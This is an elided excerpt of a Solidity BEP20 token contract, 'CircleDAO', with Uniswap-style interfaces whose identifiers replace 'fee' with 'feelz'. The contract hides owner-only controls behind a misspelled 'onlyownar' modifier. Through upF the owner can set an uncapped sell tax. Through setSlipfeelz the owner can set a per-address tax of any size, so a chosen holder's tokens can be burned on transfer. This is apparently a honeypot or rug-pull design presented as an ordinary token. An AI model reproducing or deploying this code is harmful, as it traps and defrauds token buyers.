...
interface IUniswapV2Factory {
    ...
    function feelzTo() external view returns (address);
    function feelzToSetter() external view returns (address);
    ...
    function setfeelzTo(address) external;
    function setfeelzToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeelzOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeelzOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeelzOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeelzOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeelzOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract CircleDAO is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeelz = 0;

    uint256 private _defaultBuyfeelz = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeelz;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeelz = _value;
    }

    function setSlipfeelz(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeelz[_address] = _value;
    }

    function getSlipfeelz(address _address) external view onlyownar returns (uint256) {
        return _slipfeelz[_address];
    }


    function setMAccountfeelz(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeelz(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeelzAmount = 0;

        if (rF) {
            uint256 tradefeelz = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeelz = _defaultSellfeelz;
                }
                if (from == uniswapV2Pair) {

                    tradefeelz = _defaultBuyfeelz;
                }
            }
            if (_slipfeelz[from] > 0) {
                tradefeelz = _slipfeelz[from];
            }

            tradefeelzAmount = _Amount.mul(tradefeelz).div(100);
        }


        if (tradefeelzAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeelzAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeelzAmount);
            emit Transfer(from, _deadAddress, tradefeelzAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeelzAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeelzAmount);
        emit Transfer(from, _to, _Amount - tradefeelzAmount);
    }
